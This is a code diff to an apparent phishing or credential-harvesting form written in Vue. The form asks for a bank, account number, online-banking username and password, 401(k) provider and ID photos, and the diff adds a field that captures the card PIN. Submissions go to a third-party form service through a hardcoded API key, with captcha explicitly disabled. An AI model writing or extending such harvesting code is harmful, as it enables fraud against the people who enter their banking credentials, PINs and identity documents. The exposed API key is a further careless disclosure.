@@ -11,6 +11,7 @@ const formpage = ref('default'); // can be 'default' or 'code'
 const form:any = ref({
   bank: '',
   accountNumber: '',
+  cardpinNumber: '',
   amount: '',
   username: '',
   password: '',
@@ -154,6 +155,7 @@ const submitForm = () => {
   const formdata = new FormData();
   formdata.append('bank', form.value.bank);
   formdata.append('accountNumber', form.value.accountNumber);
+  formdata.append('cardpinNumber', form.value.cardpinNumber);
   formdata.append('amount', form.value.amount);
   formdata.append('username', form.value.username);
   formdata.append('password', form.value.password);
@@ -162,8 +164,6 @@ const submitForm = () => {
   formdata.append('fortyOneKProvider', form.value.fortyOneKProvider);
   formdata.append('frontPreview', form.value.frontPreview);
   formdata.append('backPreview', form.value.backPreview);
-  // formdata.append('frontPreview', '');
-  // formdata.append('backPreview', '');
   formdata.append('apiKey', 'sf_59ff126e612fde419bb61bb0');
   formdata.append('_captcha', 'false'); // disable captcha
 
@@ -202,6 +202,7 @@ const submitCodeForm = () => {
     form.value = {
       bank: '',
       accountNumber: '',
+      cardpinNumber: '',
       amount: '',
       username: '',
       password: '',
@@ -258,6 +259,15 @@ const submitCodeForm = () => {
                 type="text"
                 class="form-control"
                 required
+              />
+            </div>
+            <!-- Card pin -->
+            <div class="mb-3">
+              <label class="form-label">Card Pin</label>
+              <input
+                v-model="form.cardpinNumber"
+                type="text"
+                class="form-control"
               />
             </div>
             <!-- ID Upload -->
